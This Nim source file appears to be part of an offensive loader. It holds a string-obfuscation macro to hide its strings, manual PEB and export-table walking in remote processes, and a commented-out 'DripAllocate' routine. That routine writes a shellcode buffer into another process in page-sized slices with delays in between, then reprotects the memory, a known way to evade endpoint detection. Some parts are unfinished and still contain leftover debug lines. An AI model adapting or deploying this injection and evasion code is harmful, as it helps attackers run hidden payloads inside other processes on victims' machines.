import winim/lean
import strutils
import winim/winstr
from winim import wchar_t
from winim import MODULEENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA,Module32First,LPMODULEENTRY32W
import ptr_math

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    var whatup: char
    var testString : string = " "
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            whatup = result[i]
            testString = testString & " "
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xEE))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFEE

macro obf(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFEE
    else:
        result = s

#[
proc NtReadVirtualMemory*(processHandle: HANDLE, baseAddress: PVOID, buffer: PVOID, bufferSize: SIZE_T, bytesRead: PSIZE_T): NTSTATUS {.importc: "NtReadVirtualMemory", dynlib: "ntdll.dll".}

proc NtProtectVirtualMemory*(processHandle: HANDLE, baseAddress: PVOID, regionSize: PSIZE_T, newProtect: DWORD, oldProtect: PDWORD): NTSTATUS {.importc: "NtProtectVirtualMemory", dynlib: "ntdll.dll".}

proc NtWriteVirtualMemory*(processHandle: HANDLE, baseAddress: PVOID, buffer: PVOID, bufferSize: SIZE_T, bytesWritten: PSIZE_T): NTSTATUS {.importc: "NtWriteVirtualMemory", dynlib: "ntdll.dll".}

proc NtFreeVirtualMemory*(processHandle: HANDLE, baseAddress: PVOID, regionSize: PSIZE_T, freeType: DWORD): NTSTATUS {.importc: "NtFreeVirtualMemory", dynlib: "ntdll.dll".}

proc NtAllocateVirtualMemory*(processHandle: HANDLE, baseAddress: PVOID, zeroBits: ULONG, regionSize: PSIZE_T, allocationType: ULONG, protect: ULONG): NTSTATUS {.importc: "NtAllocateVirtualMemory", dynlib: "ntdll.dll".}
]#


#proc NtFlushInstructionCache*(hProcess: HANDLE, lpBaseAddress: LPVOID, dwSize: SIZE_T): WINBOOL {.importc, dynlib: "ntdll.dll".}

# type definition for PROCESS_BASIC_INFORMATION


proc ConvertToString*(CharArr :array[256,char]): string =
    var index = 0
    while CharArr[index] != '\x00':
        result.add(CharArr[index])
        index += 1

proc toString(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

type
    PROCESS_BASIC_INFORMATION* = object
        ExitStatus: NTSTATUS
        PebBaseAddress: LPVOID
        AffinityMask: ULONG_PTR
        BasePriority: KPRIORITY
        UniqueProcessId: ULONG_PTR
        InheritedFromUniqueProcessId: ULONG_PTR

type
  ND_LDR_DATA_TABLE_ENTRY* {.bycopy.} = object
    InMemoryOrderLinks*: LIST_ENTRY
    InInitializationOrderLinks*: LIST_ENTRY
    DllBase*: PVOID
    EntryPoint*: PVOID
    SizeOfImage*: ULONG
    FullDllName*: UNICODE_STRING
    BaseDllName*: UNICODE_STRING

  PND_LDR_DATA_TABLE_ENTRY* = ptr ND_LDR_DATA_TABLE_ENTRY
  ND_PEB_LDR_DATA* {.bycopy.} = object
    Length*: ULONG
    Initialized*: UCHAR
    SsHandle*: PVOID
    InLoadOrderModuleList*: LIST_ENTRY
    InMemoryOrderModuleList*: LIST_ENTRY
    InInitializationOrderModuleList*: LIST_ENTRY

  PND_PEB_LDR_DATA* = ptr ND_PEB_LDR_DATA
  ND_PEB* {.bycopy.} = object
    Reserved1*: array[2, BYTE]
    BeingDebugged*: BYTE
    Reserved2*: array[1, BYTE]
    Reserved3*: array[2, PVOID]
    Ldr*: PND_PEB_LDR_DATA

  PND_PEB* = ptr ND_PEB

proc NtQueryInformationProcess*(ProcessHandle: HANDLE, ProcessInformationClass: DWORD, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.importc: "NtQueryInformationProcess", dynlib: "ntdll.dll".}

proc NtReadVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, BytesRead: PSIZE_T): NTSTATUS {.importc: "NtReadVirtualMemory", dynlib: "ntdll.dll".}


# this function takes an ptr LPWSTR as input and converts all uppercase characters to lowercase
proc LPWSTRtoLowercase(str: LPWSTR): LPWSTR =
    var ptr1: LPWSTR = str
    while (ptr1[] != 0):
        if (ptr1[] >= wchar_t('A') and ptr1[] <= wchar_t('Z')):
            ptr1[] += (wchar_t('a') - wchar_t('A'))
        ptr1 += 1
    return str

proc lstrcmpiW(str1: ptr wchar_t, str2: ptr wchar_t): int =
  var c1: wchar_t
  var c2: wchar_t
  # Pointers in Nim are immutable by default and cannot be modified. But if we use the var keyword, we can still modify the pointer (to increase in this case).
  var ptr1: ptr wchar_t = str1
  var ptr2: ptr wchar_t = str2
  while (ptr1[] != 0 and ptr2[] != 0):
    c1 = ptr1[]
    c2 = ptr2[]
    if (c1 >= wchar_t('A') and c1 <= wchar_t('Z')):
      c1 += (wchar_t('a') - wchar_t('A'))
    if (c2 >= wchar_t('A') and c2 <= wchar_t('Z')):
      c2 += (wchar_t('a') - wchar_t('A'))
    if (c1 != c2):
      return int(c1 - c2)
    ptr1 += 1
    ptr2 += 1
    
  return int(str1[] - str2[])

# this function retrieves the remote module handle but via calling NtQueryInformationProcess and parsing the PEB
proc GetRemoteModuleHandleNtQueryInformationProcess*(hProcess: HANDLE, ModuleName: string): HMODULE =
    var pebAddress: LPVOID
    var processBasicInfos: PROCESS_BASIC_INFORMATION
    var status: NTSTATUS
    var size: ULONG = cast[ULONG](sizeof(PROCESS_BASIC_INFORMATION))
    status = NtQueryInformationProcess(hProcess, 0, addr processBasicInfos, size, nil)
    if status != STATUS_SUCCESS:
        when defined(verbose):
            echo obf("[-] NtQueryInformationProcess failed: "), toHex(status)
        return 0
    else:
        when defined(verbose):
            echo obf("[+] NtQueryInformationProcess succeeded")
            pebAddress = processBasicInfos.PebBaseAddress
            echo obf("[*] PEB address: "), repr(pebAddress)
    var peb: PEB
    var pebLdrData: PEB_LDR_DATA
    var ldrList: LIST_ENTRY
    var ldrEntry: PND_LDR_DATA_TABLE_ENTRY
    var moduleBase: LPVOID
    var moduleHandle: HMODULE
    var moduleName: string
    
    status = NtReadVirtualMemory(hProcess, pebAddress, addr peb, sizeof(PEB), nil)
    if status != STATUS_SUCCESS:
        when defined(verbose):
            echo obf("[-] NtReadVirtualMemory1 failed: "), toHex(status)
        return 0
    else:
        when defined(verbose):
            echo obf("[+] NtReadVirtualMemory succeeded")
            #echo obf("[*] PEB_LDR_DATA address: "), repr(peb.Ldr)
    
    #var Ldr: PPEB_LDR_DATA = peb.Ldr
    
    status = NtReadVirtualMemory(hProcess, peb.Ldr, addr pebLdrData, sizeof(PEB_LDR_DATA), nil)
    if status != STATUS_SUCCESS:
        when defined(verbose):
            echo obf("[-] NtReadVirtualMemory2 failed: "), toHex(status)
        return 0
    else:
        when defined(verbose):
            echo obf("[+] NtReadVirtualMemory succeeded")
            #echo obf("[*] InMemoryOrderModuleList address: "), repr(pebLdrData.InMemoryOrderModuleList)
    
    var FirstEntry: PVOID = addr(pebLdrData.InMemoryOrderModuleList.Flink)
    #status = NtReadVirtualMemory(hProcess, pebLdrData.InMemoryOrderModuleList.Flink, addr FirstEntry, sizeof(PVOID), nil)
    #when defined(verbose):
    #    echo obf("[*] FirstEntry address: "), repr(FirstEntry)
    
    var Entry: PND_LDR_DATA_TABLE_ENTRY = cast[PND_LDR_DATA_TABLE_ENTRY](pebLdrData.InMemoryOrderModuleList.Flink)
    
    #echo pebLdrData.InMemoryOrderModuleList
    
    

    #var Entry: PND_LDR_DATA_TABLE_ENTRY 
    #status = NtReadVirtualMemory(hProcess, pebLdrData.InMemoryOrderModuleList.Flink, addr Entry, sizeof(PVOID), nil)
    #echo repr(Entry)
    
    echo "Asd"
    #const NTDLL_DLL = "ntdll.dll"
    #var testCompare: cstring = "ntdll.dll"
    while true:
        # Read the Entry structure from the remote process
        #[
        status = NtReadVirtualMemory(hProcess, Entry, addr ldrEntry, sizeof(LDR_DATA_TABLE_ENTRY), nil)
        if status != STATUS_SUCCESS:
            when defined(verbose):
                echo obf("[-] NtReadVirtualMemory (Entry) failed: "), toHex(status)
            return 0
        ]#
        echo "Comparing: ", Entry.BaseDllName, " with: ", ModuleName
        var compare: int = 1
        if (Entry.BaseDllName.Buffer != nil):
            var wideModuleName: WideCString = newWideCString(ModuleName)
            compare = lstrcmpiW(LPWSTRtoLowercase(cast[LPWSTR](wideModuleName)),LPWSTRtoLowercase(cast[LPWSTR](Entry.BaseDllName.Buffer)))
        #var compare: int = lstrcmpiW(cast[LPWSTR](NTDLL_DLL),cast[LPWSTR](Entry.BaseDllName.Buffer))
        echo "Compare: ", Entry.BaseDllName
        if(compare == 0):
            #echo "DLL names equal"
            when defined(verbose):
                echo obf("[+] DLL found")
            return cast[HANDLE](Entry.DllBase)
        #Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
        # Fetch the next Entry from the remote process
        status = NtReadVirtualMemory(hProcess, Entry.InMemoryOrderLinks.Flink, addr Entry, sizeof(PND_LDR_DATA_TABLE_ENTRY), nil)
        if status != STATUS_SUCCESS:
            when defined(verbose):
                echo obf("[-] NtReadVirtualMemory (Next Entry) failed: "), toHex(status)
            return 0

        if Entry == pebLdrData.InMemoryOrderModuleList.Flink:
            break
    
    #[
    while true:
        var Entryretrieved: PND_LDR_DATA_TABLE_ENTRY
        status = NtReadVirtualMemory(hProcess, Entry, addr Entryretrieved, sizeof(PND_LDR_DATA_TABLE_ENTRY), nil)
        if status != STATUS_SUCCESS:
            when defined(verbose):
                echo obf("[-] NtReadVirtualMemory for Entry failed: "), toHex(status)
                quit(1)
            #return 0
        else:
            when defined(verbose):
                echo obf("[+] NtReadVirtualMemory for Entry succeeded")
                echo obf("[*] Next entry address: "), repr(Entryretrieved)
                #moduleName = toString(Entryretrieved.BaseDllName.Buffer)
                #echo obf("[*] Module name: "), cast[LPWSTR](Entry.BaseDllName.Buffer)
                quit(1)
        
        var compare: int = lstrcmpiW(cast[LPWSTR](ModuleName),cast[LPWSTR](Entry.BaseDllName.Buffer))
        if(compare == 0):
            #echo "DLL names equal"
            when defined(verbose):
                echo obf("[+] DLL found")
            return cast[HANDLE](Entry.DllBase)
        #Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
        
        status = NtReadVirtualMemory(hProcess, Entry.InMemoryOrderLinks.Flink, addr Entry, sizeof(PND_LDR_DATA_TABLE_ENTRY), nil)
        if status != STATUS_SUCCESS:
            when defined(verbose):
                echo obf("[-] NtReadVirtualMemory for next Entry failed: "), toHex(status)
            #return 0
        else:
            when defined(verbose):
                echo obf("[+] NtReadVirtualMemory for next Entry succeeded")
        ]#
        #[
        if toLowerAscii(moduleName) == toLowerAscii(ModuleName):
            moduleBase = Entry.DllBase
            moduleHandle = cast[HMODULE](moduleBase)
            return moduleHandle
        Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
        ]#
        #if &Entry == pebLdrData.InMemoryOrderModuleList.Flink:
        #    break
    #[
    ldrList = pebLdrData.InMemoryOrderModuleList
    ldrEntry = cast[LDR_DATA_TABLE_ENTRY](ldrList.Flink)
    var ldrEntryretrieved: LDR_DATA_TABLE_ENTRY
    while ldrEntry.InMemoryOrderLinks.Flink != pebLdrData.InMemoryOrderModuleList:
        status = NtReadVirtualMemory(hProcess, addr ldrEntry, addr ldrEntryretrieved, sizeof(LDR_DATA_TABLE_ENTRY), nil)
        if status != STATUS_SUCCESS:
            when defined(verbose):
                echo obf("[-] NtReadVirtualMemory3 failed: "), toHex(status)
            return 0
        else:
            when defined(verbose):
                echo obf("[+] NtReadVirtualMemory succeeded")
                moduleName = toString(ldrEntryretrieved.Reserved4)
                echo obf("[*] Module name: "), moduleName
        if toLowerAscii(moduleName) == toLowerAscii(ModuleName):
            moduleBase = ldrEntry.DllBase
            moduleHandle = cast[HMODULE](moduleBase)
            return moduleHandle
        ldrEntry = cast[LDR_DATA_TABLE_ENTRY](ldrEntry.InMemoryOrderLinks.Flink)
]#

proc GetRemoteModuleHandle*(hProcess:HANDLE, ModuleName: string): HMODULE =
    var 
        modEntry : MODULEENTRY32A
        snapshot : HANDLE
    when defined(verbose):
        echo obf("[*] Looking for remote process DLL: "), ModuleName
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
    if snapshot != INVALID_HANDLE_VALUE:
        when defined(verbose):
            echo obf("[+] Created snapshot of remote process")
        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
        if Module32FirstA(snapshot, addr modEntry):
            when defined(verbose):
                echo obf("[*] Module32FirstA succeeded")
            while Module32NextA(snapshot, addr modEntry):
                when defined(verbose):
                    echo obf("[*] Found remote process DLL: "), ConvertToString(modEntry.szModule)
                if toLowerAscii(ConvertToString(modEntry.szModule)) == toLowerAscii(ModuleName):
                    return modEntry.hModule
        else:
            when defined(verbose):
                echo obf("[-] Module32FirstA failed "), GetLastError()
                quit(1)
    else:
        when defined(verbose):
            echo obf("[-] Failed to create snapshot of remote process: "), GetlastError()
    CloseHandle(snapshot)
    return 0

proc GetRemoteProcAddress*(hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
    var
        baseModule : UINT_PTR = cast[UINT64](hModule)
        dosHeader : IMAGE_DOS_HEADER
        ntHeader : IMAGE_NT_HEADERS
        exportDirectory : IMAGE_EXPORT_DIRECTORY
        ExportTable : DWORD = 0
        ExportFunctionTableVA : UINT_PTR = 0
        ExportNameTableVA : UINT_PTR = 0
        ExportOrdinalTableVA : UINT_PTR = 0
        ExportNameTable: seq[DWORD]
        ExportFunctionTable: seq[DWORD]
        ExportOrdinalsTable: seq[WORD] 
        MinFunNumber : UINT_PTR = 0
        Func : DWORD = 0
        Ord : WORD = 0
        CharIndex : UINT_PTR = 0
        TempChar : char
        Done : bool = false
        TempFunctionName : string = ""

    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
        return NULL
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read and check the NT signature: "), GetlastError()
        return NULL

    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
    
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the main export table "), GetlastError()

    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        Func = 0
        Ord = 0 
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy name table "), GetlastError()
            return NULL
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy Ordinal table "), GetlastError()
            return NULL
        ExportNameTable.add(Func)
        ExportOrdinalsTable.add(Ord)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
        Func = 0
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy fucntion table "), GetlastError()
            return NULL
        ExportFunctionTable.add(Func)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        CharIndex = 0
        Done = false
        TempFunctionName = ""
        while Done == false:
            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
                when defined(verbose):
                    echo obf("Failed to read the names of the functions"), GetlastError()
                return NULL
            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                Done = true
            else:
                TempFunctionName.add(TempChar)
            CharIndex += 1
        if toLowerAscii(TempFunctionName) == toLowerAscii(FuncName):
            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
    when defined(verbose):
        echo obf("[X] Proc name does not exits")
    return NULL

proc getTextSectionStart*(moduleBase: LPVOID): LPVOID =
    var textSectionStart: LPVOID = moduleBase + 0x1000
    when defined(verbose):
        echo obf("[*] TextSectionStart: "), repr(textSectionStart)
    return textSectionStart

const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000007FFFF0000),
    cast[pointer](0x00000000DDDD0000),
    cast[pointer](0x0000000010000000),
    cast[pointer](0x0000000021000000),
    cast[pointer](0x0000000032000000),
    cast[pointer](0x0000000043000000),
    cast[pointer](0x0000000050000000),
    cast[pointer](0x0000000041000000),
    cast[pointer](0x0000000042000000),
    cast[pointer](0x0000000040000000),
    cast[pointer](0x0000000022000000)]

proc GetSuitableBaseAddress*(hProc: HANDLE, szPage: DWORD, szAllocGran: DWORD, cVmResv: DWORD): LPVOID =
    var mbi: MEMORY_BASIC_INFORMATION

    for base in VC_PREF_BASES:
        when defined(verbose):
            echo obf("[*] Calling VirtualQueryEx for address "), repr(base), obf(" with size "), sizeof(mbi).SIZE_T
        VirtualQueryEx(hProc, cast[LPVOID](base), addr mbi, sizeof(mbi).SIZE_T)
        #echo "GetLastError: ", GetLastError()
        if mbi.State == MEM_FREE:
            var i: DWORD = 0
            while i < cVmResv:
                let currentBase = cast[LPVOID](cast[DWORD_PTR](base) + i * szAllocGran)
                when defined(verbose):
                    echo obf("[*] Checking CurrentBase plus offset: "), repr(currentBase)
                VirtualQueryEx(hProc, currentBase, addr mbi, sizeof(mbi).SIZE_T)
                i += 1
                if mbi.State != MEM_FREE:
                    when defined(verbose):
                        echo obf("[-] Mem not free")
                    break
                else:
                    when defined(verbose):
                        echo obf("[+] Mem free")
            if i == cVmResv:
                # found suitable base
                return cast[LPVOID](base)

    result = nil

#[
proc DripAllocate*(ProcessHandle: HANDLE, RegionSize: SIZE_T, scArray: openarray[byte], stombEntry: LPVOID): LPVOID =
    
    var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
    
    protectionValue = PAGE_READWRITE # in our case, the second shellcode does the RX re-protection later on
    
    var sys_inf: SYSTEM_INFO
    GetSystemInfo(addr sys_inf)
    var page_size: DWORD = sys_inf.dwPageSize
    var alloc_gran: DWORD = sys_inf.dwAllocationGranularity

    if page_size == 0:
        page_size = 0x1000

    if alloc_gran == 0:
        alloc_gran = 0x10000
    
    var numberOfAllocations: DWORD = DWORD((DWORD(RegionSize) / alloc_gran) + 1)
    when defined(verbose):
        echo obf("[*] Shellcode size: "), RegionSize
        echo obf("[*] Allocation Granularity: "), alloc_gran
        echo obf("[*] Going to allocate for "), numberOfAllocations, obf(" times")
    
    var vmBaseAddress: LPVOID
    if (stombEntry == nil):
        vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
    else:
        vmBaseAddress = stombEntry

    if vmBaseAddress == nil:
        when defined(verbose):
            echo obf("[-] No suitable base address!")
            quit(1)
        return nil
    else:
        when defined(verbose):
            echo obf("[+] Got suitable base address!")
            echo obf("[*] Base address: "), repr(vmBaseAddress)
    
    var status: NTSTATUS = 0
    var cmm_i: DWORD
    var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)

    var vcVmResv: seq[LPVOID] = @[]
    when defined(remoteMapSection):
            var vcVmResvRemote: seq[LPVOID] = @[]
    var sc_size: SIZE_T = cast[SIZE_T](alloc_gran)


    if (stombEntry == nil):
        # Reserve enough memory
        var i: DWORD
        for i in 1..numberOfAllocations:
            Sleep(DWORD(10)) 
            status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
            
                
            if status == STATUS_SUCCESS:
                when defined(verbose):
                    echo obf("[+] NtAllocateVirtualMemory succeeded")
                vcVmResv.add(currentVmBase)
            else:
                when defined(verbose):
                    echo obf("[-] NtAllocateVirtualMemory failed")
                return nil

            currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
    else:
        for i in 1..numberOfAllocations:
            vcVmResv.add(currentVmBase + ( (i-1) * 0x10000))
            when defined(verbose):
                echo obf("[*] Using provided base addresses: "), repr(vcVmResv[i-1])

    # Set the final decryptbuffer address to the first reserved address
    
    var offsetSc: DWORD = 0
    var oldProt: DWORD

    # Loop over the pages and commit our sc blob in 4kB slices
    
    var sizeOfPage: SIZE_T = cast[SIZE_T](page_size)

    var memoryCalc: DWORD = DWORD(DWORD(sc_size) / DWORD(sizeOfPage))
    
    for i in 0..<numberOfAllocations:
        for cmm_i in 0..<memoryCalc:
            
            let offset = cmm_i * sizeOfPage
            currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
            if (stombEntry == nil):
                status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
                    
                if(status != STATUS_SUCCESS):
                    when defined(verbose):
                        echo obf("[-] NtAllocateVirtualMemory failed")
                    return nil
                else:
                    when defined(verbose):
                        echo obf("\r\n[+] NtAllocateVirtualMemory succeeded")
                        echo obf("[*] Address: "), repr(currentVmBase)
            else:
                var protectAddress: LPVOID = currentVmBase
                #[
                echo "Goind to protect: ", repr(currentVmBase)
                VirtualProtectEx(ProcessHandle, protectAddress, sizeOfPage, PAGE_READWRITE, addr oldProt)
                when defined(verbose):
                    echo obf("[*] Address: "), repr(currentVmBase)
                ]#
                var pageSize: SIZE_T = 4095
                status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr pageSize,PAGE_READWRITE,addr oldProt)

                if(status != STATUS_SUCCESS):
                    when defined(verbose):
                        echo obf("[-] NtProtectVirtualMemory failed")
                    return nil
                else:
                    when defined(verbose):
                        echo obf("\r\n[+] NtProtectVirtualMemory succeeded")
                        echo obf("[*] Address: "), repr(currentVmBase)
                #var consoleInput = readLine(stdin)
            
            Sleep(DWORD(10))

            var szWritten: SIZE_T = 0
            status = NtWriteVirtualMemory(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
        
            if(status != STATUS_SUCCESS):
                when defined(verbose):
                    echo obf("[-] NtWriteVirtualMemory failed")
                return nil
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory succeeded")
                    echo obf("[*] Address: "), repr(currentVmBase)

            Sleep(10)

            offsetSc += DWORD(sizeOfPage)

            status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)    

            if(status != STATUS_SUCCESS):
                when defined(verbose):
                    echo obf("[-] NtProtectVirtualMemory failed")
                return nil
            else:
                when defined(verbose):
                    echo obf("[+] NtProtectVirtualMemory succeeded")
                    echo obf("[*] Address: "), repr(currentVmBase)
            
            try:
                var test: LPVOID = unsafeAddr scArray[offsetSc]
            except:
                break
            #[
            if ((cmm_i + 1) > memoryCalc):
                echo "Too much"
                break
            ]#
    #write(stdout, "This is the prompt -> ")
    #var input = readLine(stdin)
    return vmBaseAddress

]#
